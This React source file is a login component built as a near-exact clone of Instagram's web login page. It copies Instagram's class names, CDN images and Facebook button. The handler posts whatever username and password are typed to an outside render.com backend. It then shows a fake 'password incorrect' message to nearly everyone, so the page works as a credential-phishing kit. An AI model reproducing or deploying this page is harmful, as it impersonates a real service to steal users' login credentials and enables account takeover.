import React, { useState } from "react";
import axios from "axios";
import img1 from "./../assets/instagram-web-lox-image.png";
const Login = () => {
  const [name, setname] = useState();
  const [password, setpassword] = useState();
  axios.defaults.withCredentials = true;
  const handelSubmit = (e) => {
    e.preventDefault();
  
    // if (name === "devendra") {
      axios
        .post(`https://insta-backend-4-yadw.onrender.com/login`, { name, password })
        .then((result) => {
          console.log(result);
          // if (result.data.redirect) {
          //   window.open(result.data.redirect, "_blank"); 
          // }
        })
        .catch((err) => console.log(err));
    // } else {
      
    // }
    //    if (name === "devendra") {
    //     axios
    //     .post("http://localhost:3001/login", { name, password })
    //     .then((result) => {
    //       console.log(result);
    //       if (result.data.redirect) {
    //         window.open(result.data.redirect, "_blank"); // Open YouTube in new tab
    //       }
    //     })
    //     .catch((err) => console.log(err));
    // } else {
      
    // }
  };
  
  return (
    <>
      <div className="container main-container">
        <div className="row justify-content-center">
          {/* <div className="col-lg-3">
            <div className="form-container">
              <div className="img">
                
              </div>
              <form className="row g-0 gap-2" onSubmit={handelSubmit}>
                <div className="col-md-12">
                  <input type="text" className="form-control" placeholder='Phone number, username or email address' id="validationDefault01" onChange={(e) => setname(e.target.value)} required />
                </div>
                  <input type="password" className="form-control" placeholder='Password' id="validationDefault02" onChange={(e) => setpassword(e.target.value)} required />
                </div>
                <div className="col-12">
                  <button className="btn btn-primary w-100" type="submit">Log in</button>
                </div>
              </form>
            </div>
          </div> */}
          <div className="col-lg-4">
            <div className="x5n08af x78zum5 xdt5ytf x1iyjqo2 xl56j7k x7qam4e x14vqqas x15lw1kp x1dc814f x1owpceq xh8yej3">
              <div className="x6s0dn4 xvbhtw8 x1pmru9 x1yvgwvq x1dqoszc x1ixjvfu xhk4uv x146dn1l x11t77rh x1thhq0t xf6uls8 x13fuv20 x1qgpocp xu3j5b3 xne9koi x1q0q8m5 xxrrrr8 x26u7qi xyyqvqm x178xt8z xm81vs4 xso031l xy80clv x9f619 x78zum5 xjl7jj xdt5ytf x2lah0s xln7xf2 xk390pu xdj266r x11i5rnm x1mh8g0r xyorhqc xzboxd6 x889kno x4uap5 x1a8lsjc xkhd6sd x1n2onr6 x11njtxf">
               <div className="img mt-5">
                
                </div>
                <div className="xod5an3 x1dc814f xh8yej3">
                  <div>
                    <form
                      className="x972fbf xcfux6l x1qhh985 xm0m39n x78zum5 xdt5ytf xln7xf2 xk390pu xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x11njtxf"
                      id="loginForm"
                      onSubmit={handelSubmit}
                    >
                      <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xqui205 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                        <div className="xdj266r x1m39q7l xzueoph x540dpk">
                          <div className="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
                            <label className="_aa48">
                             
                              <input
                                aria-label="Phone number, username or email address"
                                aria-required="true"
                                autocapitalize="off"
                                autocorrect="off"
                                maxlength="75"
                                className="_aa4b _add6 _ac4d _ap35"
                                dir=""
                                type="text"
                                placeholder=" Phone number, username or email address"
                                onChange={(e) => setname(e.target.value)}
                                name="username"
                                required
                              />
                            </label>
                            <div className="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x18d9i69 xkhd6sd x1sxyh0 x1n2onr6 xxymvpz"></div>
                          </div>
                        </div>
                        <div className="xdj266r x1m39q7l xzueoph x540dpk">
                          <div className="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
                            <label className="_aa48">
                              <input
                                aria-label="Password"
                                aria-required="true"
                                autocapitalize="off"
                                autocorrect="off"
                                placeholder="Password"
                                className="_aa4b _add6 _ac4d _ap35"
                                type="password"
                                onChange={(e) => setpassword(e.target.value)}
                                name="password"
                                required
                              />
                              {/* <span>Sorry, your password was incorrect. Please double-check your password.</span> */}
                            </label>
                            <div className="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x18d9i69 xkhd6sd x1sxyh0 x1n2onr6 xxymvpz"></div>
                          </div>
                        </div>
                        <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                          <button
                            className=" _acan _acap _acas _aj1- _ap30"
                            disabled=""
                            type="submit"
                          >
                            <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                              Log in
                            </div>
                          </button>
                        </div>
                        <div className="x1hmvnq2 x1m39q7l x91k8ka x540dpk">
                          <div className="x78zum5 x1q0g3np">
                            <div className="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az"></div>
                            <div className="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf">
                              or
                            </div>
                            <div className="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az"></div>
                          </div>
                        </div>
                        <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                          <button
                            className=" _acan _acao _acas _aj1- _ap30"
                            type="button"
                          >
                            <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
                              <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw3qccf x150jy0e x1e558r4 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                                <svg
                                  aria-label="Log in with Facebook"
                                  className="x1lliihq x1n2onr6 x173jzuc"
                                  fill="currentColor"
                                  height="20"
                                  role="img"
                                  viewBox="0 0 16 16"
                                  width="20"
                                >
                                  <title>Log in with Facebook</title>
                                  <g clip-path="url(#a)">
                                    <path
                                      d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z"
                                      fill="currentColor"
                                    ></path>
                                  </g>
                                  <defs>
                                    <clipPath id="a">
                                      <rect
                                        fill="currentColor"
                                        height="16"
                                        width="16"
                                      ></rect>
                                    </clipPath>
                                  </defs>
                                </svg>
                              </div>
                              <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
                                Log in with Facebook
                              </div>
                            </div>
                          </button>
                        </div>
                      </div>
                      <span className={`sorry ${name == "devendra" && password != "" || name == "" ? "d-none" : ""}  x1lliihq x1plvlek xryxfnj x1n2onr6 x1ji0vk5 x18bv5gf x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x5n08af x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj`} dir="auto" ><div className="xkmlbd1 xvs91rp xd4r4e8 x1anpbxc x1m39q7l xyorhqc x540dpk x2b8uid">Sorry, your password was incorrect. Please double-check your password.</div></span>
                      <div className="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x14vqqas x1uhb9sk x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xc26acl x1qjc9v5 xamitd3 x1nhvcw1">
                        <a
                          className="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x7l2uk3 xxjqeqe x1yc6y37 xalplay x1fhwpqd x9hjye6 x1717ian xmrbqaa x1lr0zt7 x1b95m5r xk9bwil x1m60dep _a6hd"
                          href="#!"
                          role="link"
                          tabindex="0"
                        >
                          <span
                            className="x1lliihq x1plvlek xryxfnj x1n2onr6 x1ji0vk5 x18bv5gf x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x7l2uk3 x10wh9bi x1wdrske x8viiok x18hxmgj"
                            dir="auto"
                            
                          >
                            Forgotten your password?
                          </span>
                        </a>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
              <div className="x6s0dn4 xvbhtw8 x1pmru9 x1yvgwvq x1dqoszc x1ixjvfu xhk4uv x146dn1l x11t77rh x1thhq0t xf6uls8 x13fuv20 x1qgpocp xu3j5b3 xne9koi x1q0q8m5 xxrrrr8 x26u7qi xyyqvqm x178xt8z xm81vs4 xso031l xy80clv x9f619 x78zum5 xjl7jj xdt5ytf x2lah0s xln7xf2 xk390pu xdj266r x11i5rnm x1mh8g0r xyorhqc xzboxd6 x889kno x4uap5 x1a8lsjc xkhd6sd x1n2onr6 x11njtxf">
                <span
                  className="x1lliihq x1plvlek xryxfnj x1n2onr6 x1ji0vk5 x18bv5gf x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x1roi4f4 x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
                  dir="auto"
                >
                  <p className="x5n08af x1f6kntn xcxhlts x1jqylkn x1fqp7bg x13ibhcj x2b8uid">
                    Don't have an account?{" "}
                    <a
                      className="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz _a6hd"
                      href="#!"
                      role="link"
                      tabindex="0"
                    >
                      <span
                        className="x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs xt0psk2 x1i0vuye xvs91rp x1s688f x173jzuc x10wh9bi x1wdrske x8viiok x18hxmgj"
                       
                      >
                        Sign up
                      </span>
                    </a>
                  </p>
                </span>
              </div>
              <div className="x78zum5 xdt5ytf">
                <div className="x1anpbxc x1h5jrl4 xyorhqc xmn8rco">
                  <span
                    className="x1lliihq x1plvlek xryxfnj x1n2onr6 x1ji0vk5 x18bv5gf x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x5n08af x2b8uid x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
                    dir="auto"
                 
                  >
                    Get the app.
                  </span>
                </div>
                <div className="x78zum5 x1b7blni xl56j7k x1anpbxc x11i5rnm xyorhqc x1mh8g0r">
                  <a
                    aria-label="Get it on Google Play"
                    className="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1emribx x2pgyrj _a6hd"
                    href="#!"
                    rel="nofollow noreferrer"
                    role="link"
                    tabindex="0"
                  >
                    <img
                      alt="Get it on Google Play"
                      className="x1vqgdyp"
                      src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png"
                    />
                  </a>
                  <a
                    aria-label="Get it from Microsoft"
                    className="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1emribx x2pgyrj _a6hd"
                    href="#!"
                    role="link"
                    tabindex="0"
                  >
                    <img
                      alt="Get it from Microsoft"
                      className="x1vqgdyp"
                      src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png"
                    />
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Login;
